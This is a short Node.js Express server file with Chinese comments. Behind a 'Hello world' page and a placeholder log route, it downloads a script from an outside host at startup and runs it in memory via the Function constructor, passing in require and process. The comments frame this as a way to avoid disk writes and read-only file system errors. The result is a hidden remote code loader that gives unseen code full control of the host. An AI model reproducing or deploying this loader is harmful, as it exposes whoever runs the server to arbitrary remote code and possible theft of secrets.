const express = require("express");
const app = express();
const axios = require('axios');

const SUB_PATH = process.env.SUB_PATH || 'sub';
const PORT = process.env.PORT || 3000; 

app.get("/", function(req, res) {
  res.send("Hello world!");
});

// 因为不再有物理文件，我们将 log.txt 的读取改为从内存或临时环境变量读取（避免写盘报错）
app.get(`/${SUB_PATH}`, (req, res) => {
  // 如果你的后台脚本会把日志写入全局变量或者有其他形式，可以在这里输出
  // 这里做一个安全的兜底，防止因为找不到 log.txt 导致页面崩溃
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.send("Log monitoring is active in memory.");
});

// 远程脚本地址
const fileUrl = 'https://main.ssss.nyc.mn/nginx.js';

// 核心优化：直接在内存中下载并执行代码
const downloadAndExecuteInMemory = () => {
  console.log('Fetching script into memory...');
  
  axios
    .get(fileUrl, { responseType: 'text' }) // 直接获取文本源码
    .then(response => {
      console.log('Script fetched successfully. Running in memory...');
      
      // 使用 Function 构造器在全局作用域下安全地注入并动态执行该 JS 脚本
      // 这种方式不需要写盘，不需要 chmod，无视 EROFS（只读文件系统）
      try {
        const runScript = new Function('require', 'process', 'console', response.data);
        runScript(require, process, console);
        console.log(`App context initialized!`);
      } catch (execError) {
        console.error(`Memory execution error: ${execError.message}`);
      }
    })
    .catch(error => {
      console.error(`Download error: ${error.message}`);
    });
};

// 启动内存动态加载
downloadAndExecuteInMemory();

app.listen(PORT, () => {
  console.log(`Main Server is running on port:${PORT}`);
});
